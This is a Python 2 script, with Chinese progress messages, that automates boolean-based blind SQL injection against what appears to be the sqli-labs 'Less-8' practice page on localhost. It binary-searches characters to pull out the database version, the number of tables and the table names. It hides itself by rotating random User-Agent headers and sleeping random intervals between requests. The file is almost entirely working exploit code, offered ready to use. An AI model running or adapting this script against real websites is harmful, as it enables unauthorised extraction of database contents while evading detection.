#-*-coding:utf8-*-
# user_agent(random) | time.sleep(random.uniform())
import requests,time
import random,sys
from fake_useragent import UserAgent
from getdbname import db_len,db_count,db_name
ua = UserAgent()
url = "http://127.0.0.1:8000/Less-8/index.php?id=1"
def table_count(left,right):
    print '\r\n-------------------------开始获取数据表数量--------------------------\r\n'
    while 1:
        mid = (left + right)/2
        if mid == left:
            break
        payload = "\' and (select(select count(table_name) from information_schema.tables where table_schema = database()))<%s"% (mid) + "%23"
        headers={"User-Agent":ua.random}
        res = requests.get(url+payload,headers=headers)
        if 'You are in' in res.text:
            right = mid
            print "[*] trying payload: " + payload
        else:
            left = mid
            print "[*] trying payload: " + payload
        time.sleep(random.uniform(1.1,5.5))
    return mid

def db_version(left, right, index):
    print '\r\n-------------------------开始猜解当前数据库版本--------------------------\r\n'
    while 1:
        mid = (left + right)/2
        if mid == left:
            ok = chr(mid)
            break
        payload = '\' and ascii(substring(version(),%s,1))<%s'% (str(index), str(mid)) + '%23'
        headers={"User-Agent":ua.random}
        res = requests.get(url+payload,headers=headers)
        if 'You are in' in res.text:
            right = mid
            print "[*] trying payload: " + payload
        else:
            left = mid
            print "[*] trying payload: " + payload
        time.sleep(random.uniform(1.1,5.5))
    return ok
def table_name(left, right, index,tablenum):
    while 1:
        mid = (left + right)/2
        if mid == left:
            ok = chr(mid)
            break
        payload = '\' and(select ascii(substr((select table_name from information_schema.tables where table_schema = database() limit '+ str(tablenum) + ',1),%s,1)))<%s'% (str(index), str(mid)) + '%23'
        headers={"User-Agent":ua.random}
        res = requests.get(url+payload,headers=headers)
        if 'You are in' in res.text:
            right = mid
            print "[*] trying payload: " + payload
        else:
            left = mid
            print "[*] trying payload: " + payload
        time.sleep(random.uniform(0.1,0.5))
    return ok
def table_len(left,right,tablenum):
    print "\r\n--------------------开始猜解第(%s)个表名长度----------------------\r\n"% (str(tablenum+1))
    while 1:
        mid = (left + right)/2
        if mid == left:
            break
        lens_payload = '\' and (select length(table_name) from information_schema.tables where table_schema = database() limit '+ str(tablenum) +',1)<%s'% (str(mid)) +'%23'
        headers={"User-Agent":ua.random}
        res = requests.get(url+lens_payload,headers=headers)
        if 'You are in' in res.text:
            right = mid
            print "[*] trying payload: " + lens_payload
        else:
            left = mid
            print "[*] trying payload: " + lens_payload
        time.sleep(random.uniform(1.1,5.5))
    return mid

if __name__ == '__main__':
    if len(sys.argv)>1 and sys.argv[1] == 'db_name':
        b = []
        database_count = db_count(1,35)
        print "\r\n-------该数据库存在("+str(database_count)+")个库\r\n"
        time.sleep(1)
        for x in range(database_count):
            l = []
            time.sleep(1)
            a = db_len(1,30,x)
            print "第"+str(x+1)+"数据库名长度为："+str(a)+'\r\n\r\n'
            print '\r\n-------------------------开始猜解第('+str(x+1) +')个库名---------------------------\r\n'
            for i in range(1,a+1):
                f = db_name(33, 127, i,x)
                l.append(f)
                print l
            dbs_name = ''.join(l)
            print dbs_name
            b.append(dbs_name)
        print "\n------databases------\n" 
        print '\n'.join(b)+'\n'
        print "---------------------"      
    elif len(sys.argv)>1 and sys.argv[1] == 'db_version':
        l = []
        for i in range(1,24):
            f = db_version(33, 127, i)
            print f
            l.append(f)
        print ''.join(l)
    elif len(sys.argv)>1 and sys.argv[1] == 'table_name':
        b = []
        tb_count = table_count(1,35)
        print "\r\n-------该数据库有("+str(tb_count)+")个表\r\n"
        time.sleep(1)
        for x in range(tb_count):
            l = []
            time.sleep(1)
            a = table_len(1,30,x)
            print "第"+str(x+1)+"表名长度为："+str(a)+'\r\n\r\n'
            print '\r\n-------------------------开始猜解第('+str(x+1) +')个表名---------------------------\r\n'
            for i in range(1,a+1):
                f = table_name(33, 127, i,x)
                l.append(f)
                print l
            tb_name = ''.join(l)
            print tb_name
            b.append(tb_name)
        print "\n------tables------\n"
        print '\n'.join(b)+'\n'  
        print "------------------"
    else:
        print '''usage: python ba.py <db_name | db_version | table_name num(获取第几个表名) | >'''  